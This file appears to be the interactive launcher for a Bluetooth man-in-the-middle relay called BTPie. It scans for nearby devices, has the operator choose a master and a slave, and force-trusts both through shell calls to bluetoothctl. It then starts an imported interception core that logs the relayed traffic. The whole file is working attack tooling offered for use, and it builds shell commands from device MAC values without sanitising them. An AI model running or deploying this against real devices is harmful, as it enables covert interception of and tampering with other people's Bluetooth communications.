import os
import time
import bluetooth
from btpie.core import MITMCore

def scan_devices():
    devices = bluetooth.discover_devices(duration=8, lookup_names=True)
    if not devices:
        print("[!] No devices found.")
    else:
        for idx, (addr, name) in enumerate(devices):
            print(f"[{idx + 1}] {addr} - {name}")
    return devices

def trust_device(mac):
    os.system(f"bluetoothctl trust {mac}")

def interactive_setup():
    print("=== BTPIE-N-THE-MIDDLE Interactive Setup ===\n")

    run_mitm = input("Run BTPie? [Y/n]: ").strip().lower()
    if run_mitm not in ("y", "yes", ""):
        print("Exiting...")
        return

    devices = scan_devices()
    if not devices:
        return

    master_index = int(input("Select Master by Number: ")) - 1
    master_mac = devices[master_index][0]
    trust_device(master_mac)

    devices = scan_devices()
    if not devices:
        return

    slave_index = int(input("Select Slave by Number: ")) - 1
    slave_mac = devices[slave_index][0]
    trust_device(slave_mac)

    use_log = input("Log to file? [Y/n]: ").strip().lower()
    log_file = "logs/session.log" if use_log in ("y", "yes", "") else None

    if log_file:
        custom_name = input("Log Name? (press Enter to use default): ").strip()
        if custom_name:
            log_file = f"logs/{custom_name}.log"

    debug = input("Debug Mode? [Y/n]: ").strip().lower() in ("y", "yes", "")
    verbose = input("Verbose Output? [Y/n]: ").strip().lower() in ("y", "yes", "")

    port = 1  # You can extend with custom port prompt if desired

    print("\nStarting MITM Relay... Press Ctrl+C to stop.\n")

    mitm = MITMCore(master_mac, slave_mac, log_file or "logs/session.log", port=port, verbose=verbose)

    try:
        mitm.start()
        while not mitm.stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping and saving log...")
        mitm.cleanup()

if __name__ == "__main__":
    interactive_setup()
